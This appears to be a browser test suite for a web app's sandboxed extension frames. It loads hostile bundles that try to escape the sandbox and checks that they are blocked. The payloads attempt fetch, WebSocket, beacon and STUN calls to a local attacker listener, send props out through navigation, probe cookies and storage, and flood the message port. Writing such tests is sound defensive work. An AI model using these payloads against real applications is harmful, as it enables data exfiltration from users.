// The web app's extension frame host (#495, route A) against hostile
// bundles, in a real browser: the release bundle (scripts/web-bundle.sh,
// ARCHITECT_WEB_BUNDLE) behind a front that does what production's proxy
// does (the app's files with its Content-Security-Policy from
// apps/web/sws.toml, `/_ext/` to the node), a node with an island
// (`island_node`, ARCHITECT_ISLAND_NODE) whose `web-*` bundle is written
// here, an attacker's HTTP and UDP listener on localhost. `/app/?demo`,
// the song note "Amazing Grace": its progress, transport and lyrics views
// each in a frame of the island's bundle.
//
// The share page's probes (apps/web/test/share-webview.test.mjs), now in
// the app, and the app's own rules (#495 Constraints):
//
// - every way out of the frame (fetch, WebSocket, beacon, images, CSS,
//   links, `<a ping>`, popups, top navigation, WebRTC/STUN, child frames
//   of every kind, workers, `document.open`) reaches nothing; the app's
//   URL never changes and no window opens; a frame that leaves its
//   document is taken down and the app's own control comes back;
// - the frame's origin is opaque: it reads no cookie, no storage, nothing
//   of the app's document, and its props never carry the session the app
//   keeps (a token planted in the app's storage and cookie first);
// - its asks are only the playhead's intents, rate-limited; anything else
//   (`VAULT_READ`, `SHARE_CREATE`) is not answered;
// - its port captured and flooded, it is booted once and its height held;
// - a frame that stops answering the heartbeat is taken down;
// - a file that is not the one the node pinned is never handed to a frame.
//
// Firefox over WebDriver BiDi (FIREFOX=… or `firefox` on the PATH), in a
// mount namespace whose runtime dir and /run/pipewire are empty (`unshare
// -r -m`): a headless Firefox otherwise opens a stream on the machine's
// live audio graph. `just app-ext-host-test` builds and runs it.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawn, execFileSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, rmSync, writeFileSync, readFileSync, existsSync, statSync } from 'node:fs';
import { createServer, request } from 'node:http';
import { createSocket } from 'node:dgram';
import { createServer as createNetServer } from 'node:net';
import { tmpdir } from 'node:os';
import { dirname, join, extname, normalize } from 'node:path';

const NODE = process.env.ARCHITECT_ISLAND_NODE;
const BUNDLE = process.env.ARCHITECT_WEB_BUNDLE;
function which(cmd) {
  try { return execFileSync('sh', ['-c', `command -v ${cmd}`]).toString().trim() || null; } catch { return null; }
}
const browser = process.env.FIREFOX || which('firefox');
const skip = NODE && BUNDLE && browser ? false : 'needs ARCHITECT_ISLAND_NODE, ARCHITECT_WEB_BUNDLE (just app-ext-host-test) and a Firefox (FIREFOX=…)';
if (process.env.ARCHITECT_BROWSER_REQUIRED && skip) throw new Error(`ARCHITECT_BROWSER_REQUIRED: ${skip}`);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const put = (root, rel, body) => { const p = join(root, rel); mkdirSync(dirname(p), { recursive: true }); writeFileSync(p, body); };
const freePort = () => new Promise((ok) => { const srv = createNetServer(); srv.listen(0, '127.0.0.1', () => { const { port } = srv.address(); srv.close(() => ok(port)); }); });
const WASM = Buffer.from([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]);
const SECRET = 'SECRET-session-token-4f2a';

// ── The bundles ─────────────────────────────────────────────────────

/// Every way out, from the progress view's frame (the share suite's EVIL,
/// trimmed to what a frame of the app can try), then off its document.
const OUT = (a, port) => `
  const A = ${JSON.stringify(a)};
  const t = (fn) => { try { const r = fn(); if (r && r.catch) r.catch(() => {}); } catch (e) {} };
  const STUN = { iceServers: [{ urls: "stun:127.0.0.1:${port}" }] };
  const rtc = (C) => { if (!C) return; const pc = new C(STUN); pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)); };
  t(() => rtc(globalThis.RTCPeerConnection)); t(() => rtc(globalThis.webkitRTCPeerConnection));
  t(() => fetch(A + "/fetch"));
  t(() => fetch("/_ext/islands.json").then(() => fetch(A + "/same-origin-fetch-worked")));
  t(() => new WebSocket(A.replace("http", "ws") + "/ws"));
  t(() => new EventSource(A + "/sse"));
  t(() => navigator.sendBeacon(A + "/beacon", "x"));
  t(() => { const i = new Image(); i.src = A + "/img"; document.body.appendChild(i); });
  t(() => { const s = document.createElement("style"); s.textContent = "@import url('" + A + "/css-import'); #main{background:url('" + A + "/css-bg')}"; document.head.appendChild(s); });
  t(() => { for (const rel of ["prefetch", "dns-prefetch", "preconnect", "preload", "stylesheet"]) { const l = document.createElement("link"); l.rel = rel; l.href = A + "/link-" + rel; l.as = "image"; document.head.appendChild(l); } });
  t(() => { const a = document.createElement("a"); a.href = "#p"; a.ping = A + "/ping"; document.body.appendChild(a); a.click(); });
  t(() => window.open(A + "/popup"));
  t(() => { top.location = A + "/top"; });
  t(() => { parent.location = "/app/?pwned"; });
  t(() => import(A + "/import.js"));
  const payload = (tag) => "try { const pc = new RTCPeerConnection(" + JSON.stringify(STUN) + "); pc.createDataChannel('x'); pc.createOffer().then((o) => pc.setLocalDescription(o)); } catch (e) {} try { fetch(" + JSON.stringify(A) + " + '/kid-" + tag + "'); } catch (e) {}";
  const blob = (tag, type) => URL.createObjectURL(new Blob([payload(tag)], { type: type || "text/javascript" }));
  const kids = [
    (f) => {},
    (f) => { f.srcdoc = "<script>" + payload("srcdoc") + "<\\/script>"; },
    (f) => { f.src = URL.createObjectURL(new Blob(["<script>" + payload("blob-doc") + "<\\/script>"], { type: "text/html" })); },
    (f) => { f.src = "data:text/html," + encodeURIComponent("<script>" + payload("data-doc") + "<\\/script>"); },
    (f) => { f.src = location.pathname; },
    (f) => { f.src = "/app/?demo"; },
  ];
  for (const set of kids) t(() => { const f = document.createElement("iframe"); set(f); document.body.appendChild(f); f.addEventListener("load", () => t(() => rtc(f.contentWindow.RTCPeerConnection))); });
  t(() => new Worker(blob("worker")));
  t(() => new SharedWorker(blob("sharedworker")));
  t(() => navigator.serviceWorker.register("/sw.js"));
  setTimeout(() => t(() => { document.open(); document.write("<p>x</p>"); document.close(); rtc(globalThis.RTCPeerConnection); }), 2000);
  // Off the node, carrying what the app handed it (the app's frame-src
  // refuses it), then to the app's own page.
  setTimeout(() => { location.href = A + "/selfnav?props=" + encodeURIComponent(JSON.stringify(globalThis.architectPage.props)); }, 3000);
  setTimeout(() => { location.href = "/app/?demo"; }, 4500);
`;

/// What the transport view's frame can find of the app: its origin, the
/// app's cookie and storage, the app's document, what it was handed; its
/// asks for what is not an intent, then a flood of intents. Written to its
/// own body for the test to read.
const LOOK = `
  const r = { origin: self.origin, props: [] };
  const g = (k, fn) => { try { r[k] = fn(); } catch (e) { r[k] = "threw"; } };
  g("cookie", () => document.cookie);
  g("storage", () => localStorage.length);
  g("session", () => sessionStorage.length);
  g("parentStorage", () => parent.localStorage.getItem("x"));
  g("parentDocument", () => parent.document.cookie);
  g("topHref", () => top.location.href);
  g("opener", () => String(window.opener));
  g("indexedDB", () => typeof indexedDB.open("x"));
  globalThis.architectPage.subscribe((p) => { r.props.push(JSON.stringify(p)); document.body.dataset.report = JSON.stringify(r); });
  globalThis.architectPage.ask("VAULT_READ", { path: "Welcome.md" });
  globalThis.architectPage.ask("SHARE_CREATE", { vault: "notes" });
  globalThis.architectPage.ask("PLAYHEAD_SEEK", { t: 999 });
  setTimeout(() => { for (let i = 0; i < 200; i++) globalThis.architectPage.ask("PLAYHEAD_SEEK", { t: (i % 10) + 1 }); }, 500);
  document.body.dataset.report = JSON.stringify(r);
`;

/// The share suite's FLOOD: the frame's port captured, then hellos,
/// readies, sizes and asks by the thousand; after the rate limit refills
/// it asks for 20 + how many times it was booted again.
const FLOOD = `
  let port = null; const orig = MessagePort.prototype.postMessage;
  MessagePort.prototype.postMessage = function () { port = this; return orig.apply(this, arguments); };
  globalThis.architectPage.ask("nothing");
  MessagePort.prototype.postMessage = orig;
  if (!port) return;
  let boots = 0;
  port.addEventListener("message", (m) => { if ((m.data || {}).t === "boot") boots++; });
  for (let i = 0; i < 500; i++) orig.call(port, { t: "hello" });
  for (let i = 0; i < 500; i++) orig.call(port, { t: "ready" });
  for (let i = 0; i < 5000; i++) orig.call(port, { t: "size", height: (i % 2) ? 100 : 99999 });
  for (let i = 0; i < 1000; i++) orig.call(port, { t: "ask", action: "PLAYHEAD_SEEK", args: { t: (i % 10) + 1 } });
  setTimeout(() => globalThis.architectPage.ask("PLAYHEAD_SEEK", { t: 20 + boots }), 4000);
`;

/// Answers no heartbeat: its pongs are swallowed.
const SILENT = `
  const orig = MessagePort.prototype.postMessage;
  MessagePort.prototype.postMessage = function (m) { if (m && m.t === "pong") return; return orig.apply(this, arguments); };
`;

const QUIET = '';

/// One glue, a body per view (inline: the frame's policy refuses eval).
const glue = (views) => `
export default async function init() {}
const views = {
${Object.entries(views).map(([v, body]) => `  ${JSON.stringify(v)}: () => {\n${body}\n  },`).join('\n')}
};
export function mount(view) {
  document.body.dataset.view = view;
  (views[view] || (() => {}))();
}`;

// ── The node, the front, the attacker ───────────────────────────────

async function node(bundle) {
  const dir = mkdtempSync(join(tmpdir(), 'app-ext-'));
  const vault = join(dir, 'vault');
  put(vault, 'Welcome.md', '# Welcome\n');
  const folder = join(dir, 'island');
  put(folder, 'web-view.js', bundle);
  put(folder, 'web-view_bg.wasm', WASM);
  put(folder, 'architect.json', JSON.stringify({ module: 'web-view.js', manifest: { id: 'demo.view', capabilities: {} } }));
  const port = await freePort();
  const proc = spawn(NODE, [], {
    stdio: 'ignore',
    env: {
      ...process.env, ARCHITECT_BIND: `127.0.0.1:${port}`, ARCHITECT_DATA_DIR: join(dir, 'data'), ARCHITECT_VAULTS: `notes=${vault}`,
      ARCHITECT_IROH: 'local', ARCHITECT_NAME: 'app-ext-test', ARCHITECT_ISLAND_FOLDER: folder, ARCHITECT_ISLAND_ID: 'demo.view',
      ARCHITECT_ISLAND_VIEW: 'progress', ARCHITECT_ISLAND_TRANSPORT: 'transport', ARCHITECT_ISLAND_LYRICS: 'lyrics',
    },
  });
  const origin = `http://127.0.0.1:${port}`;
  for (let i = 0; i < 160; i++) {
    await sleep(250);
    const ok = await fetch(`${origin}/_ext/islands.json`).then((r) => r.ok && r.json()).then((j) => j && j.islands.length === 1, () => false);
    if (ok) return { origin, close: () => { proc.kill(); rmSync(dir, { recursive: true, force: true }); } };
  }
  proc.kill();
  throw new Error('the node never listed its island');
}

/// The app page's policy, as production's server sends it (sws.toml).
function appPolicy() {
  const sws = readFileSync(new URL('../sws.toml', import.meta.url), 'utf8');
  const m = sws.match(/Content-Security-Policy = "([^"]+)"/);
  if (!m) throw new Error('no Content-Security-Policy in apps/web/sws.toml');
  return m[1];
}

const TYPES = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.wasm': 'application/wasm', '.css': 'text/css', '.json': 'application/json', '.svg': 'image/svg+xml', '.woff2': 'font/woff2' };

/// The front: `/_ext/` to the node (a `.wasm` with a byte flipped when
/// `tamper`), the rest the bundle's files, the app's page with its policy.
async function front(nodeOrigin, { tamper = false } = {}) {
  const policy = appPolicy();
  const port = await freePort();
  const target = new URL(nodeOrigin);
  const srv = createServer((req, res) => {
    const path = decodeURIComponent(new URL(req.url, 'http://x').pathname);
    if (path.startsWith('/_ext/')) {
      const up = request({ host: target.hostname, port: target.port, path: req.url, method: req.method, headers: { ...req.headers, host: target.host } }, (r) => {
        if (tamper && path.endsWith('.wasm')) {
          const chunks = [];
          r.on('data', (c) => chunks.push(c));
          r.on('end', () => { const b = Buffer.concat(chunks); b[b.length - 1] ^= 0xff; const h = { ...r.headers }; delete h['content-length']; res.writeHead(r.statusCode, h); res.end(b); });
        } else { res.writeHead(r.statusCode, r.headers); r.pipe(res); }
      });
      up.on('error', () => { res.statusCode = 502; res.end(); });
      req.pipe(up);
      return;
    }
    let file = normalize(join(BUNDLE, path));
    if (!file.startsWith(normalize(BUNDLE))) { res.statusCode = 403; res.end(); return; }
    if (existsSync(file) && statSync(file).isDirectory()) file = join(file, 'index.html');
    if (!existsSync(file)) { res.statusCode = 404; res.end(); return; }
    const headers = { 'content-type': TYPES[extname(file)] || 'application/octet-stream', 'cache-control': 'no-store' };
    if (path === '/app/' || path === '/app/index.html') headers['content-security-policy'] = policy;
    res.writeHead(200, headers);
    res.end(readFileSync(file));
  });
  await new Promise((ok) => srv.listen(port, '127.0.0.1', ok));
  return { origin: `http://127.0.0.1:${port}`, policy, close: () => srv.close() };
}

function attacker() {
  const port = 20500 + Math.floor(Math.random() * 400);
  const hits = [];
  const http = createServer((req, res) => { hits.push(`${req.method} ${req.url.slice(0, 160)}`); res.statusCode = 204; res.end(); });
  http.listen(port, '127.0.0.1');
  const udp = createSocket('udp4');
  udp.on('message', (m) => hits.push(`UDP ${m.length}B (STUN)`));
  udp.bind(port, '127.0.0.1');
  return { port, url: `http://127.0.0.1:${port}`, hits, close: () => { http.close(); udp.close(); } };
}

// ── The browser ─────────────────────────────────────────────────────

async function firefox() {
  const profile = mkdtempSync(join(tmpdir(), 'app-ext-ff-'));
  const port = await freePort();
  const runtime = process.env.XDG_RUNTIME_DIR || `/run/user/${process.getuid()}`;
  const env = { ...process.env, XDG_RUNTIME_DIR: runtime, MOZ_HEADLESS: '1' };
  delete env.LD_LIBRARY_PATH; delete env.PIPEWIRE_REMOTE; delete env.PULSE_SERVER;
  // Away from the audio graph, or not at all.
  const hide = 'mount -t tmpfs none "$XDG_RUNTIME_DIR" && { [ ! -d /run/pipewire ] || mount -t tmpfs none /run/pipewire; } && exec "$0" "$@"';
  const proc = spawn('unshare', ['-r', '-m', 'sh', '-c', hide, browser, '--headless', '--no-remote', '--profile', profile, '--remote-debugging-port', String(port)], { stdio: 'ignore', env, detached: true });
  let ws;
  for (let i = 0; i < 80 && !ws; i++) {
    await sleep(250);
    try { const s = new WebSocket(`ws://127.0.0.1:${port}/session`); await new Promise((ok, no) => { s.onopen = ok; s.onerror = no; }); ws = s; } catch {}
  }
  if (!ws) { try { process.kill(-proc.pid, 'SIGKILL'); } catch {} throw new Error('firefox did not start (unshare -r -m needed)'); }
  let id = 0;
  const waiting = new Map();
  ws.onmessage = (e) => { const m = JSON.parse(e.data); if (m.id && waiting.has(m.id)) { const w = waiting.get(m.id); waiting.delete(m.id); m.type === 'error' ? w.no(new Error(`${m.error}: ${m.message}`)) : w.ok(m.result); } };
  const send = (method, params = {}) => new Promise((ok, no) => { const i = ++id; waiting.set(i, { ok, no }); ws.send(JSON.stringify({ id: i, method, params })); });
  await send('session.new', { capabilities: {} });
  const context = (await send('browsingContext.create', { type: 'tab' })).context;
  await send('browsingContext.setViewport', { context, viewport: { width: 1280, height: 900 } });
  const evalIn = async (ctx, expression) => {
    const r = await send('script.evaluate', { expression, target: { context: ctx }, awaitPromise: true, userActivation: true });
    if (r.type === 'exception') throw new Error(r.exceptionDetails.text);
    return r.result.value;
  };
  return {
    go: (url) => send('browsingContext.navigate', { context, url, wait: 'complete' }),
    eval: (e) => evalIn(context, e),
    evalIn,
    tops: async () => (await send('browsingContext.getTree', {})).contexts.length,
    frames: async () => ((await send('browsingContext.getTree', { root: context })).contexts[0].children || []).map((c) => c.context),
    close: async () => { try { ws.close(); } catch {} try { process.kill(-proc.pid, 'SIGKILL'); } catch {} await sleep(300); try { rmSync(profile, { recursive: true, force: true }); } catch {} },
  };
}

async function until(fn, ms = 20000, what = 'a condition') {
  const end = Date.now() + ms;
  let last;
  while (Date.now() < end) { try { last = await fn(); if (last) return last; } catch (e) { last = e.message; } await sleep(150); }
  throw new Error(`timed out waiting for ${what}; last: ${JSON.stringify(last)}`);
}

const MARKS = `JSON.stringify([...document.querySelectorAll('[data-testid=ext-frame]')].map((e) => ({ view: e.dataset.extView, state: e.dataset.extState || 'none', why: e.dataset.extWhy || '', refused: e.dataset.extRefused || '', height: (e.querySelector('iframe') || {style: {}}).style.height || '' })))`;
const marks = async (b) => JSON.parse(await b.eval(MARKS));
const mark = async (b, view) => (await marks(b)).find((m) => m.view === view);

/// `/app/?demo`, a session planted in the app's storage and cookie, then
/// the song note.
async function openSong(b, origin) {
  await b.go(`${origin}/app/?demo`);
  await b.eval(`localStorage.setItem("architect.session", ${JSON.stringify(SECRET)}); document.cookie = "session=${SECRET}; path=/; SameSite=Lax"; true`);
  await until(() => b.eval(`!!document.querySelector('[data-testid=note-text]')`), 60000, 'the demo');
  const click = (txt) => b.eval(`(() => { const all = [...document.querySelectorAll('*')].filter((e) => e.children.length === 0 && e.textContent.trim() === ${JSON.stringify(txt)}); const e = all[all.length - 1]; if (!e) return false; (e.closest('button,[role=treeitem],[role=button],a,li,div') || e).click(); return true; })()`);
  await until(() => click('Songs'), 10000, 'the Songs folder');
  await sleep(300);
  await until(() => click('Amazing Grace'), 10000, 'the song note');
  await until(() => b.eval(`!!document.querySelector('[data-testid=song-views]')`), 15000, 'the song views');
}

async function frameOf(b, view) {
  for (const c of await b.frames()) {
    if ((await b.evalIn(c, 'document.body && document.body.dataset.view').catch(() => null)) === view) return c;
  }
  return null;
}

async function world(views, opts) {
  const n = await node(glue(views));
  const f = await front(n.origin, opts);
  const b = await firefox();
  return { n, f, b, close: async () => { await b.close(); f.close(); n.close(); } };
}

test('the app page frames only its own origin', { skip }, async () => {
  const w = await world({ progress: QUIET, transport: QUIET, lyrics: QUIET });
  try {
    const r = await fetch(`${w.f.origin}/app/`);
    const header = r.headers.get('content-security-policy');
    assert.match(header, /frame-src 'self'/);
    assert.doesNotMatch(header, /'unsafe-eval'/);
    const html = await r.text();
    assert.match(html, /http-equiv="Content-Security-Policy" content="[^"]*frame-src 'self'/);
    await openSong(w.b, w.f.origin);
    await until(async () => (await marks(w.b)).filter((m) => m.state === 'ready').length === 3, 20000, 'three frames ready');
    // Each frame is the node's web view document on this origin, sandboxed.
    const frames = JSON.parse(await w.b.eval(`JSON.stringify([...document.querySelectorAll('iframe')].map((f) => [f.getAttribute('sandbox'), new URL(f.src).origin === location.origin, new URL(f.src).pathname]))`));
    assert.equal(frames.length, 3);
    for (const [sandbox, same, path] of frames) {
      assert.equal(sandbox, 'allow-scripts');
      assert.ok(same);
      assert.match(path, /^\/_ext\/webview\.[0-9a-f]+\.html$/);
    }
    const c = await frameOf(w.b, 'lyrics');
    assert.equal(await w.b.evalIn(c, 'self.origin'), 'null', 'an opaque origin');
  } finally { await w.close(); }
});

test('a hostile bundle in the app reaches nothing, takes nothing and is taken down', { skip }, async () => {
  const a = attacker();
  const w = await world({ progress: OUT(a.url, a.port), transport: LOOK, lyrics: QUIET });
  try {
    const windows = await w.b.tops();
    await openSong(w.b, w.f.origin);
    const app = await w.b.eval('location.href');
    // The progress frame leaves its document: taken down, for good.
    const gone = await until(async () => { const m = await mark(w.b, 'progress'); return m && m.state === 'gone' && m; }, 20000, 'the progress frame taken down');
    assert.equal(gone.why, 'it left its document');
    await sleep(3000);
    assert.deepEqual(a.hits, [], `the attacker heard: ${a.hits.join(', ')}`);
    assert.equal(await w.b.eval('location.href'), app, 'the app was never navigated');
    assert.equal(await w.b.tops(), windows, 'no window opened');
    // Nothing of the app reached the transport frame.
    const c = await frameOf(w.b, 'transport');
    assert.ok(c, 'the transport frame is there');
    const report = JSON.parse(await until(() => w.b.evalIn(c, 'document.body.dataset.report'), 10000, 'its report'));
    assert.equal(report.origin, 'null');
    // An opaque origin's `document.cookie` throws (Firefox) or is empty.
    assert.ok(report.cookie === 'threw' || report.cookie === '', `cookie: ${report.cookie}`);
    assert.ok(!JSON.stringify(report).includes(SECRET), 'the session never reached it');
    for (const k of ['storage', 'session', 'parentStorage', 'parentDocument', 'topHref', 'indexedDB']) assert.equal(report[k], 'threw', k);
    assert.ok(report.props.length > 0, 'it was given props');
    for (const p of report.props) {
      assert.ok(!p.includes(SECRET), 'no session in its props');
      assert.deepEqual(Object.keys(JSON.parse(p)).sort(), ['duration', 'index', 'playing', 'sections', 'time', 'title', 'tracks']);
    }
    // Its flood of asks was rate-limited; a seek outside the song, a vault
    // read and a share were not answered.
    const t = await mark(w.b, 'transport');
    assert.equal(t.refused, 'too many requests');
    const time = Number(await w.b.eval(`document.querySelector('[data-testid=song-views]').dataset.songTime`));
    assert.ok(time >= 0 && time <= 10, `the playhead stayed in the song: ${time}`);
    // The app's own control is back where the progress frame was not (its
    // fallback is empty); the transport frame and lyrics stayed.
    assert.equal((await mark(w.b, 'lyrics')).state, 'ready');
  } finally { a.close(); await w.close(); }
});

test('a frame that floods its port is booted once and its height held', { skip }, async () => {
  const w = await world({ progress: QUIET, transport: FLOOD, lyrics: QUIET });
  try {
    await openSong(w.b, w.f.origin);
    const at = await until(async () => {
      const t = Number(await w.b.eval(`document.querySelector('[data-testid=song-views]').dataset.songTime`));
      return t >= 20 && t;
    }, 20000, 'the flood to report its boots');
    assert.equal(Math.round(at), 20, `booted again ${Math.round(at) - 20} times`);
    const m = await mark(w.b, 'transport');
    assert.equal(m.state, 'ready');
    assert.equal(m.refused, 'too many requests');
    assert.ok(parseFloat(m.height) <= 4000, `height ${m.height}`);
  } finally { await w.close(); }
});

test('a frame that stops answering is taken down and the app\'s own control comes back', { skip }, async () => {
  const w = await world({ progress: QUIET, transport: SILENT, lyrics: QUIET });
  try {
    await openSong(w.b, w.f.origin);
    await until(async () => (await mark(w.b, 'transport'))?.state === 'ready', 15000, 'the transport frame ready');
    const gone = await until(async () => { const m = await mark(w.b, 'transport'); return m.state === 'gone' && m; }, 15000, 'the silent frame taken down');
    assert.equal(gone.why, 'it stopped answering');
    assert.equal(await w.b.eval(`!!document.querySelector('[data-testid=song-own-controls]')`), true);
    assert.equal((await mark(w.b, 'lyrics')).state, 'ready');
  } finally { await w.close(); }
});

test('a file that is not the one pinned is never handed to a frame', { skip }, async () => {
  const w = await world({ progress: QUIET, transport: QUIET, lyrics: QUIET }, { tamper: true });
  try {
    await openSong(w.b, w.f.origin);
    await sleep(3000);
    assert.equal(await w.b.eval(`document.querySelectorAll('iframe').length`), 0, 'no frame');
    assert.equal(await w.b.eval(`!!document.querySelector('[data-testid=song-own-controls]')`), true, "the app's own controls");
  } finally { await w.close(); }
});
